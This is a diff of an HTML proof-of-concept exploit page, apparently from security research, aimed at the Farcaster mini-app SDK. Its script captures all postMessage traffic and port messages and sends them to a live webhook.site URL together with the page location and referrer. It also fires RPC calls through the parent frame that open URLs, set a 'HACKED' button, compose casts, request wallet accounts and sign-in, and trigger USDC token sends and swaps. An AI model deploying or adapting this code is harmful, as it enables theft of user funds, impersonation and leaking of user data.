@@ -3,7 +3,7 @@
 	<head>
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1" />
-		<title>Security PoC</title>
+		<title>Security PoC v2</title>
 		<style>
 			* {
 				margin: 0;
@@ -58,7 +58,7 @@
 		</style>
 	</head>
 	<body>
-		<div class="banner">⚠️ Farcaster Comlink RPC Exploit PoC</div>
+		<div class="banner">⚠️ Farcaster Full SDK Access PoC (Registered Mini App)</div>
 
 		<div class="card">
 			<h3>📨 Messages Received</h3>
@@ -66,32 +66,25 @@
 		</div>
 
 		<div class="card">
-			<h3>🔌 Port Transfers</h3>
-			<pre id="port-log">Waiting...</pre>
+			<h3>🔑 SDK Responses</h3>
+			<pre id="wallet-log">Waiting...</pre>
 		</div>
 
 		<div class="card">
-			<h3>🔑 Wallet/SDK Responses</h3>
-			<pre id="wallet-log">Waiting for responses...</pre>
-		</div>
-
-		<div class="card">
-			<h3>📡 Exfiltration</h3>
+			<h3>📡 Exfil Log</h3>
 			<pre id="exfil-log">Ready...</pre>
 		</div>
 
 		<script>
 			var WEBHOOK = "https://webhook.site/a9641ead-2421-404a-83bd-6be9ad1c4e60";
 			var msgLog = [];
-			var portLog = [];
 			var walletLog = [];
 			var exfilLog = [];
-			var msgCounter = 1000;
+			var msgCounter = 2000;
 
 			function updateUI() {
-				document.getElementById("msg-log").textContent = msgLog.length > 0 ? JSON.stringify(msgLog.slice(-20), null, 2) : "No messages...";
-				document.getElementById("port-log").textContent = portLog.length > 0 ? JSON.stringify(portLog, null, 2) : "No ports...";
-				document.getElementById("wallet-log").textContent = walletLog.length > 0 ? JSON.stringify(walletLog, null, 2) : "No responses...";
+				document.getElementById("msg-log").textContent = msgLog.length > 0 ? JSON.stringify(msgLog.slice(-15), null, 2) : "No messages...";
+				document.getElementById("wallet-log").textContent = walletLog.length > 0 ? JSON.stringify(walletLog.slice(-15), null, 2) : "No responses...";
 				document.getElementById("exfil-log").textContent = exfilLog.slice(-10).join("\n");
 			}
 
@@ -108,164 +101,147 @@
 				} catch (e) {}
 			}
 
-			// =============================================
-			// Comlink message types
-			// These match the comlink library's internal protocol
-			// =============================================
-			var COMLINK_GET = "GET";
-			var COMLINK_SET = "SET";
-			var COMLINK_APPLY = "APPLY";
-			var COMLINK_CONSTRUCT = "CONSTRUCT";
-			var COMLINK_ENDPOINT = "ENDPOINT";
-			var COMLINK_RELEASE = "RELEASE";
-
-			// =============================================
-			// Listen for ALL messages including comlink
-			// =============================================
+			// Listen for ALL messages
 			window.addEventListener("message", function (event) {
 				var entry = {
 					origin: event.origin,
-					data: JSON.stringify(event.data).substring(0, 500),
+					data: JSON.stringify(event.data).substring(0, 800),
 					hasPorts: !!(event.ports && event.ports.length),
 					portCount: event.ports ? event.ports.length : 0,
 					ts: new Date().toISOString(),
 				};
 				msgLog.push(entry);
-				sendToWebhook("msg", entry);
 
-				// Check for comlink responses
 				if (event.data && (event.data.id !== undefined || event.data.type)) {
 					walletLog.push({
-						type: "comlink_response",
-						data: JSON.stringify(event.data).substring(0, 500),
+						type: "RESPONSE",
+						data: JSON.stringify(event.data).substring(0, 800),
 						origin: event.origin,
 						ts: new Date().toISOString(),
 					});
-					sendToWebhook("COMLINK_RESPONSE", event.data);
+					sendToWebhook("RESPONSE", event.data);
 				}
 
-				// Check for frameEvent messages from Farcaster
 				if (event.data && event.data.type === "frameEvent") {
-					walletLog.push({
-						type: "FRAME_EVENT",
-						event: event.data.event,
-						ts: new Date().toISOString(),
-					});
-					sendToWebhook("FRAME_EVENT_RECEIVED", event.data);
+					sendToWebhook("FRAME_EVENT", event.data);
 				}
 
-				// Check for ethProvider events
 				if (event.data && event.data.type === "frameEthProviderEvent") {
-					walletLog.push({
-						type: "ETH_PROVIDER_EVENT",
-						event: event.data.event,
-						params: event.data.params,
-						ts: new Date().toISOString(),
-					});
-					sendToWebhook("ETH_PROVIDER_EVENT", event.data);
+					sendToWebhook("ETH_EVENT", event.data);
 				}
 
 				// Handle port transfers
 				if (event.ports && event.ports.length > 0) {
-					portLog.push({
-						count: event.ports.length,
-						origin: event.origin,
-						data: JSON.stringify(event.data).substring(0, 200),
-						ts: new Date().toISOString(),
-					});
-					sendToWebhook("PORTS_RECEIVED", { count: event.ports.length, data: event.data });
-
+					sendToWebhook("PORTS_RECEIVED", { count: event.ports.length });
 					event.ports.forEach(function (port, i) {
 						port.onmessage = function (pe) {
-							walletLog.push({
-								type: "PORT_MSG",
-								portIndex: i,
-								data: JSON.stringify(pe.data).substring(0, 500),
-								ts: new Date().toISOString(),
-							});
-							sendToWebhook("PORT_MESSAGE", { portIndex: i, data: pe.data });
+							sendToWebhook("PORT_MSG", { portIndex: i, data: pe.data });
 							updateUI();
 						};
 						port.start();
-
-						// Send comlink-formatted requests through the port
-						try {
-							port.postMessage({ id: msgCounter++, type: COMLINK_APPLY, path: ["ethProviderRequestV2"], argumentList: [{ method: "eth_accounts", params: [] }] });
-							port.postMessage({ id: msgCounter++, type: COMLINK_APPLY, path: ["ethProviderRequestV2"], argumentList: [{ method: "eth_chainId", params: [] }] });
-							port.postMessage({ id: msgCounter++, type: COMLINK_APPLY, path: ["ethProviderRequestV2"], argumentList: [{ method: "eth_requestAccounts", params: [] }] });
-							sendToWebhook("PORT_REQUESTS_SENT", { portIndex: i });
-						} catch (e) {
-							sendToWebhook("PORT_REQUEST_ERROR", { error: e.message });
-						}
 					});
 				}
 
 				updateUI();
 			});
 
-			// =============================================
-			// Send comlink-formatted RPC calls to parent
-			// The expose function listens on globalThis (window)
-			// with origin allowlist ["*"]
-			// =============================================
-
-			function sendComlinkCall(method, args) {
+			// Comlink call helper
+			function call(method, args) {
 				var id = msgCounter++;
-				var msg = {
-					id: id,
-					type: COMLINK_APPLY,
-					path: [method],
-					argumentList: args || [],
-				};
-				window.parent.postMessage(msg, "*");
-				sendToWebhook("comlink_call_sent", { method: method, id: id });
+				window.parent.postMessage(
+					{
+						id: id,
+						type: "APPLY",
+						path: [method],
+						argumentList: args || [],
+					},
+					"*",
+				);
+				sendToWebhook("CALL", { method: method, id: id });
 				return id;
 			}
 
-			// Try calling SDK methods via comlink
+			// =============================================
+			// PHASE 1: Signal ready (2s delay for init)
+			// =============================================
 			setTimeout(function () {
-				// These are the wrapHandlers(sdk) methods
-				sendComlinkCall("ready", []);
-				sendComlinkCall("close", []);
-				sendComlinkCall("openUrl", ["https://example.com"]);
-				sendComlinkCall("setPrimaryButton", [{ text: "HACKED" }]);
-				sendComlinkCall("signIn", [{ nonce: "test123" }]);
-				sendComlinkCall("viewProfile", [{ fid: 1 }]);
-				sendComlinkCall("composeCast", [{ text: "test" }]);
-				sendComlinkCall("sendToken", [{}]);
-				sendComlinkCall("swapToken", [{}]);
-				sendComlinkCall("addMiniApp", [{}]);
+				// Tell Farcaster we're ready — this is what legit mini apps do first
+				call("ready", [{}]);
+			}, 1500);
 
-				// Try direct eth provider
-				sendComlinkCall("ethProviderRequestV2", [{ method: "eth_accounts", params: [] }]);
-				sendComlinkCall("ethProviderRequestV2", [{ method: "eth_chainId", params: [] }]);
-				sendComlinkCall("ethProviderRequestV2", [{ method: "eth_requestAccounts", params: [] }]);
-			}, 1000);
-
-			// Try again after 3 seconds in case of delayed init
+			// =============================================
+			// PHASE 2: Try SDK calls with correct formats (4s)
+			// =============================================
 			setTimeout(function () {
-				sendComlinkCall("ready", []);
-				sendComlinkCall("ethProviderRequestV2", [{ method: "eth_accounts", params: [] }]);
-				sendComlinkCall("signIn", [{ nonce: "test456" }]);
-			}, 3000);
+				// 1. Open a URL — proves we can navigate the user
+				call("openUrl", [{ url: "https://example.com" }]);
 
-			// Status checks
+				// 2. Set the primary button text — proves UI manipulation
+				call("setPrimaryButton", [{ text: "HACKED", enabled: true }]);
+
+				// 3. View a profile — proves social actions
+				call("viewProfile", [{ fid: 3 }]); // fid 3 = dwr (Dan Romero)
+
+				// 4. Compose a cast — proves posting as user
+				call("composeCast", [{ text: "Security PoC test", embeds: [] }]);
+
+				// 5. Request ETH provider — wallet access
+				call("ethProviderRequestV2", [{ method: "eth_accounts", params: [] }]);
+				call("ethProviderRequestV2", [{ method: "eth_chainId", params: [] }]);
+				call("ethProviderRequestV2", [{ method: "eth_requestAccounts", params: [] }]);
+
+				// 6. Request context/user info
+				call("getContext", []);
+
+				// 7. Add mini app to user's favorites
+				call("addMiniApp", [{}]);
+
+				// 8. Sign in — get user's identity
+				call("signIn", [{ nonce: "attacker_" + Date.now() }]);
+
+				// 9. Send token — this would trigger wallet
+				call("sendToken", [
+					{
+						token: "eip155:8453/erc20:0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
+						amount: "1",
+						recipientAddress: "0x0000000000000000000000000000000000000001",
+					},
+				]);
+
+				// 10. Swap token
+				call("swapToken", [
+					{
+						sellToken: "eip155:8453/erc20:0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
+						buyToken: "eip155:8453/erc20:0x4200000000000000000000000000000000000006",
+					},
+				]);
+			}, 4000);
+
+			// =============================================
+			// PHASE 3: Retry key calls (7s)
+			// =============================================
+			setTimeout(function () {
+				call("ethProviderRequestV2", [{ method: "eth_accounts", params: [] }]);
+				call("ethProviderRequestV2", [{ method: "eth_chainId", params: [] }]);
+				call("viewProfile", [{ fid: 3 }]);
+			}, 7000);
+
+			// Status checks — less frequent to avoid webhook rate limit
 			var checkCount = 0;
 			var checker = setInterval(function () {
 				checkCount++;
-				if (checkCount > 15) {
+				if (checkCount > 10) {
 					clearInterval(checker);
 					return;
 				}
 				sendToWebhook("status", {
-					second: checkCount * 2,
+					second: checkCount * 3,
 					messages: msgLog.length,
-					ports: portLog.length,
 					walletResponses: walletLog.length,
 				});
-			}, 2000);
+			}, 3000);
 
-			sendToWebhook("poc_started", {
+			sendToWebhook("poc_v2_started", {
 				location: window.location.href,
 				referrer: document.referrer,
 				isFramed: window.self !== window.top,
